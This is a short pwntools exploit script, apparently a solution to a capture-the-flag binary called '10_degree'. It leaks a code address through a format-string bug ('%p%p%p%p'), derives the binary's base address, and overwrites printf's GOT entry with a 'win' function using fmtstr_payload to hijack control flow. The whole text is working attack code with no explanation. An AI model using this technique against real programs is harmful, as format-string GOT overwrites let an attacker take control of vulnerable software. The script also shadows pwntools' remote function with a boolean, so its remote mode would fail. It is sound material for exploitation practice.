from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./10_degree"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

# leak code segment address
p.sendlineafter("Your guess:", "%p%p%p%p")
code_leak = int(p.recvline()[28:38], 16)
log.info(hex(code_leak))

# calculate code base
elf.address = code_leak - (elf.sym['vuln'] + 15)
log.info(elf.sym['win'])

payload = fmtstr_payload(4, {elf.got['printf']: elf.sym['win']})
p.sendlineafter("Your guess", payload)

p.interactive()
